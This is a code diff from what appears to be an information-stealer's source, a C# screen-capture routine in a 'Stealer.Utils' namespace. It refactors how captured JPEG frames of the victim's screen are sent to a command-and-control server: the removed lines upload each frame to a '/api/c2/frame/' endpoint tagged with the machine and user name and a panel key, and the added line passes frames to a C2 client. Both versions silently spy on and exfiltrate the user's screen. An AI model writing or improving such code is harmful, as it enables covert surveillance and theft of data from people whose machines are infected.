@@ -2,7 +2,6 @@ using System;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Net;
 using System.Threading;
 
 namespace Stealer.Utils
@@ -29,10 +28,6 @@ namespace Stealer.Utils
         {
             int delay = 1000 / Math.Max(fps, 1);
 
-            string baseUrl = GetBaseUrl();
-            string clientId = Environment.MachineName + "_" + Environment.UserName;
-            string uploadUrl = baseUrl + "/api/c2/frame/" + Uri.EscapeDataString(clientId);
-
             var jpegEncoder = GetJpegEncoder();
             var qualityParam = new EncoderParameters(1);
             qualityParam.Param[0] = new EncoderParameter(Encoder.Quality, (long)Math.Max(10, Math.Min(quality, 100)));
@@ -44,11 +39,7 @@ namespace Stealer.Utils
                     byte[] frameData = CaptureScreen(jpegEncoder, qualityParam);
                     if (frameData != null)
                     {
-                        var wc = new WebClient();
-                        wc.Headers[HttpRequestHeader.ContentType] = "application/octet-stream";
-                        if (!string.IsNullOrEmpty(Config.SecretKey))
-                            wc.Headers["x-panel-key"] = Config.SecretKey;
-                        wc.UploadData(uploadUrl, frameData);
+                        C2Client.SendBinary(frameData);
                     }
                 }
                 catch { }
@@ -104,15 +95,6 @@ namespace Stealer.Utils
                 if (codec.MimeType == "image/jpeg") return codec;
             }
             return null;
-        }
-
-        private static string GetBaseUrl()
-        {
-            Config.Initialize();
-            string url = Config.PanelUrl.TrimEnd('/');
-            int idx = url.LastIndexOf("/api/upload");
-            if (idx > 0) url = url.Substring(0, idx);
-            return url;
         }
     }
 }
